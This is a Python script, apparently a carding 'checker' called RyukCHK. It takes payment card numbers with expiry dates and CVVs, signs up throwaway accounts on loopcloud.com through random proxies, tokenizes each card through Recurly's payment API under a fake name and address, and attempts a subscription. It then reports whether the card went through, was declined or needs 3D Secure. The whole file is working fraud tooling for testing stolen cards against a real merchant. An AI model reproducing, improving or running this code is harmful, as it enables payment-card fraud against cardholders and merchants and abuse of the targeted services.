
from cgitb import html
import json
import aiohttp
import certifi
import ssl
import random
import asyncio
import platform
from bs4 import BeautifulSoup
import html

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

async def RyukCHK(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        try:
            splitter = cc.split('|')
            ccnum    = splitter[0]
            mes      = splitter[1]
            ano      = splitter[2]
            cvv      = splitter[3] 
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Connection': 'keep-alive',
            })
            async with session.get('https://www.loopcloud.com/cloud/subscriptions/new?spi=6', proxy=str(proxyrand), timeout=15) as resp:
                try :          
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    authenticity_token1 = soup.find("input", {"name": "authenticity_token"})["value"]
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 


            randemail = f"Hian{random.randint(100,999)}Marcelo{random.randint(100,999)}@gmail.com"
            data = {
                'utf8': '✓',
                'authenticity_token': authenticity_token1,
                'user[terms]': '1',
                'cm': '',
                'after_login_path': '',
                'user[email]': randemail,
                'user[password]': '646rPsKrxJAbzXv',
                'user[password_confirmation]': '646rPsKrxJAbzXv',
                'user[newsletter_subscription]': 'true',
                'user[other_newsletter_subscription]': 'false',

            }
            async with session.post('https://www.loopcloud.com/cloud/subscriptions/registration', data=data, proxy=str(proxyrand), timeout=15) as resp:
                try :          
                    response = await resp.text()
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️' 
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️' 
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️' 

            async with session.get('https://www.loopcloud.com/cloud/subscriptions/new?plan_id=6', proxy=str(proxyrand), timeout=15) as resp:
                try :          
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    authenticity_token2 = soup.find("input", {"name": "authenticity_token"})["value"]
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️' 
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️' 
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Content-type': 'application/x-www-form-urlencoded',
                'Origin': 'https://api.recurly.com',
                'Connection': 'keep-alive',
                'Referer': 'https://api.recurly.com/js/v1/field.html',
            }
            data = f'first_name=Jian&last_name=Kim&address1=1802%20street&city=Miami&postal_code=33130&state=FL&country=US&token=&number={ccnum}&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=es-MX&browser[referrer_url]=https%3A%2F%2Fwww.loopcloud.com%2Fcloud%2Fsubscriptions%2Fnew%3Fspi%3D1&browser[screen_height]=768&browser[screen_width]=1366&browser[time_zone_offset]=420&browser[user_agent]=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A101.0%29%20Gecko%2F20100101%20Firefox%2F101.0&month={mes}&year={ano}&cvv={cvv}&version=4.21.1&key=ewr1-C9TNhCAwlAdyxwMsx9aWuo&deviceId=IHeWVBGnlGacFPwK&sessionId=5HUQsU5jQoW4PglY&instanceId=kULda5gUiKKrXk4s'
            async with session.post('https://api.recurly.com/js/v1/token', headers=headers, data=data, timeout=15,  proxy=str(proxyrand)) as resp:
                try :  
                    response = await resp.json()
                    idrecurly = response['id']
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️' 
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️' 
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️' 

            json_data = {
                'utf8': '✓',
                'authenticity_token': authenticity_token2,
                'cm': '',
                'subscription[billing_info_attributes][first_name]': 'Jian',
                'subscription[billing_info_attributes][last_name]': 'Kim',
                'subscription[billing_info_attributes][address]': '1802 street',
                'subscription[billing_info_attributes][city]': 'Miami',
                'subscription[billing_info_attributes][postal_code]': '33130',
                'subscription[billing_info_attributes][province]': 'FL',
                'subscription[billing_info_attributes][country]': 'US',
                'promo_code': '',
                'recurly_token': idrecurly,
                'terms': 'on',
            }
            async with session.post('https://www.loopcloud.com/cloud/subscriptions', data=json_data, proxy=str(proxyrand), timeout=15) as resp:
                try :
                    response = await resp.text()
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️' 
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️' 
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'

            if int(response.find('&quot;Subscription created&quot')) > 0 :
                await session.close()
                return "Subscription Completed"
            elif int(response.find('&quot;error&quot')) > 0 :
                lines = response.split("\n")
                for i in lines:
                    if 'subscriptions-body__wrapper js-beatport' in i:
                        sucio = i
                for i in sucio.split("<div"):
                    if  ' data-react-class' in i:
                        sucio_2 = i
                ErrorMessage = (json.loads((html.unescape(sucio_2)).replace(' data-react-class="Flash" data-react-props="', "").replace('"></div>', "")))['msg']
                await session.close()
                return ErrorMessage
            elif int(response.find('recurly-3ds')) > 0 :
                await session.close()
                return "3D REQUIRED"
            elif int(response.find('&quot;visible&quot')) > 0 :
                await session.close()
                return "3D REQUIRED"
            else :
                await session.close()
                print(response)
                return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ♻️"
